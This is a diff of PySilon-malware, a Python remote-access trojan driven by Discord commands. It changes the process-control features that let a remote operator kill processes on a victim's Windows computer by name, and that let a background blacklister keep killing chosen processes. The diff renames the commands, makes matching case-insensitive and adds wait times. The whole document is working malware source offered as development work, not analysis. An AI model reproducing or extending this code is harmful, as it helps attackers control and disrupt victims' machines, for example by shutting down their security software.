@@ -122,10 +122,10 @@ elif message.content == '.foreground':
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         #.log Sent message with the process name 
-elif message.content[:8] == '.disable':
+elif message.content[:10] == '.blacklist':
     await message.delete()
-    if message.content.strip() == '.disable':
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .disable <process-name>```', colour=discord.Colour.red())
+    if message.content.strip() == '.blacklist':
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     else:
@@ -134,21 +134,21 @@ elif message.content[:8] == '.disable':
         with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
             disabled_processes_list = disabled_processes.readlines()
         for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
-        if message.content[9:] not in disabled_processes_list:
-            disabled_processes_list.append(message.content[9:])
+        if message.content[11:] not in disabled_processes_list:
+            disabled_processes_list.append(message.content[11:])
             with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                 disabled_processes.write('\n'.join(disabled_processes_list))
-            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[9:]} has been added to process blacklist```', colour=discord.Colour.green())
+            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         else:
             embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-elif message.content[:7] == '.enable':
+elif message.content[:10] == '.whitelist':
     await message.delete()
-    if message.content.strip() == '.enable':
-        embed = discord.Embed(title="📛 Error",description='```Syntax: .enable <process-name>```', colour=discord.Colour.red())
+    if message.content.strip() == '.whitelist':
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     else:
@@ -157,15 +157,15 @@ elif message.content[:7] == '.enable':
         with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
             disabled_processes_list = disabled_processes.readlines()
         for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
-        if message.content[8:] in disabled_processes_list:
-            disabled_processes_list.pop(disabled_processes_list.index(message.content[8:]))
+        if message.content[11:] in disabled_processes_list:
+            disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
             with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                 disabled_processes.write('\n'.join(disabled_processes_list))
-            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[8:]} has been removed from process blacklist```', colour=discord.Colour.green())
+            embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         else:
-            embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted, so there\'s nothing to enable```', colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
 elif message.content[:5] == '.kill':
@@ -204,14 +204,14 @@ elif message.content[:5] == '.kill':
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             #.log Sent message about missing process list 
-    elif message.content[6:] in [proc.name() for proc in process_iter()]:
+    elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
         #.log Process list is not generated, but valid process name is provided 
-        stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:]}', capture_output=True, shell=True).stdout).strip()
+        stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()}', capture_output=True, shell=True).stdout).strip()
         #.log Tried to kill provided process 
-        await asyncio.sleep(0.5)
-        if message.content[6:] not in [proc.name() for proc in process_iter()]:
+        await asyncio.sleep(1)
+        if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
             #.log Process is not running anymore 
-            embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:]}```', colour=discord.Colour.green())
+            embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             #.log Sent message about successfull kill 
@@ -247,15 +247,16 @@ def process_blacklister():
                 process_blacklist = disabled_processes.readlines()
             for x, y in enumerate(process_blacklist): process_blacklist[x] = y.replace('\n', '')
             for process in process_blacklist:
-                if process in [proc.name() for proc in process_iter()]:
+                if process.lower() in [proc.name().lower() for proc in process_iter()]:
                     stdout = force_decode(subprocess.run(f'taskkill /f /IM {process}', capture_output=True, shell=True).stdout).strip()
-                    #.log Tried to kill provided process 
-                    if process not in [proc.name() for proc in process_iter()]:
+                    #.log Tried to kill provided process
+                    time.sleep(1)
+                    if process.lower() not in [proc.name().lower() for proc in process_iter()]:
                         #.log Process is not running anymore 
-                        embed = discord.Embed(title="🟢 Success",description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
+                        embed = discord.Embed(title="🟢 Success", description=f'```Process Blacklister killed {process}```', colour=discord.Colour.green())
                         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                         embeds_to_send.append([channel_ids['main'], embed])
-                        #.log Sent message about successfull kill 
+                        #.log Sent message about successful kill
                     else:
                         #.log Process is still running 
                         embed = discord.Embed(title="📛 Error",description=f'```Process Blacklister tried to kill {process} but it\'s still running...```', colour=discord.Colour.red())
